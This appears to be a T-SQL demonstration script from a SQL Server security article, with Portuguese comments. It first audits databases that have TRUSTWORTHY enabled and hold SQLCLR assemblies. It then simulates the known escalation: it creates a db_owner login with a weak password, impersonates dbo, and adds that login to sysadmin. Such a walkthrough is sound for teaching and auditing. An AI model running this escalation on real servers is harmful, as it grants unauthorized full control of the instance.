USE [master]
GO



---------------------- verificando bancos com a propriedade trustworthy ---------------------------------

SELECT database_id, [name], owner_sid, state_desc, is_trustworthy_on
FROM sys.databases
WHERE is_trustworthy_on = 1


---------------------- verificando bancos com a propriedade trustworthy e assemblies (SQLCLR) criados ---------------------------------

IF (OBJECT_ID('tempdb..#Bancos_Trustworthy') IS NOT NULL) DROP TABLE #Bancos_Trustworthy
CREATE TABLE #Bancos_Trustworthy
(
    [database_id] INT,
    [name] NVARCHAR(128),
    [owner_sid] VARBINARY(85),
    [db_owner_member] NVARCHAR(128),
    [state_desc] NVARCHAR(60),
    [is_trustworthy_on] BIT,
    [assembly_name] NVARCHAR(128),
    [permission_set_desc] NVARCHAR(60),
    [create_date] DATETIME
)

INSERT INTO #Bancos_Trustworthy
EXEC sys.sp_MSforeachdb '
SELECT 
    A.database_id, 
    A.[name], 
    A.owner_sid,
    C.member_name,
    A.state_desc, 
    A.is_trustworthy_on,
    B.[name] AS assembly_name,
    B.permission_set_desc,
    B.create_date
FROM 
    [?].sys.databases A
    LEFT JOIN [?].sys.assemblies B ON B.is_user_defined = 1
    OUTER APPLY (
        SELECT B.[name] AS member_name
        FROM [?].sys.database_role_members A
        JOIN [?].sys.database_principals B ON A.member_principal_id = B.principal_id
        JOIN [?].sys.database_principals C ON A.role_principal_id = C.principal_id
        WHERE C.[name] = ''db_owner''
        AND C.is_fixed_role = 1
        AND B.principal_id > 4
    ) C
WHERE
    A.is_trustworthy_on = 1
    AND A.[name] = ''?'''
    

SELECT * FROM #Bancos_Trustworthy



------------------- habilitando a propriedade trustworthy para simular um ataque -------------------

ALTER DATABASE [dirceuresende] SET TRUSTWORTHY ON
GO


---------------------- criando um novo login para simular um ataque ---------------------------------

CREATE LOGIN [teste_trustworthy] WITH PASSWORD = 'dirceu', CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF, DEFAULT_DATABASE=[master]
GO

USE [dirceuresende]
GO

CREATE USER [teste_trustworthy] FOR LOGIN [teste_trustworthy]
GO

ALTER ROLE [db_owner] ADD MEMBER [teste_trustworthy]
GO


---------------------- conecta com usuário teste_trustworthy ---------------------------------

USE [dirceuresende]
GO

EXECUTE AS USER = 'dbo'
GO

SELECT
    USER_NAME() AS [USER_NAME],
    USER AS [USER],
    SESSION_USER AS [SESSION_USER],
    SUSER_SNAME() AS [SUSER_SNAME],
    SUSER_NAME() AS [SUSER_NAME],
	ORIGINAL_LOGIN() AS [ORIGINAL_LOGIN],
    IS_SRVROLEMEMBER('sysadmin') AS [IS_SYSADMIN],
	IS_SRVROLEMEMBER('securityadmin') AS [IS_SECURITYADMIN]


ALTER SERVER ROLE [sysadmin] ADD MEMBER [teste_trustworthy]
GO


SELECT
    USER_NAME() AS [USER_NAME],
    USER AS [USER],
    SESSION_USER AS [SESSION_USER],
    SUSER_SNAME() AS [SUSER_SNAME],
    SUSER_NAME() AS [SUSER_NAME],
	ORIGINAL_LOGIN() AS [ORIGINAL_LOGIN],
    IS_SRVROLEMEMBER('sysadmin') AS [IS_SYSADMIN],
	IS_SRVROLEMEMBER('securityadmin') AS [IS_SECURITYADMIN]
	
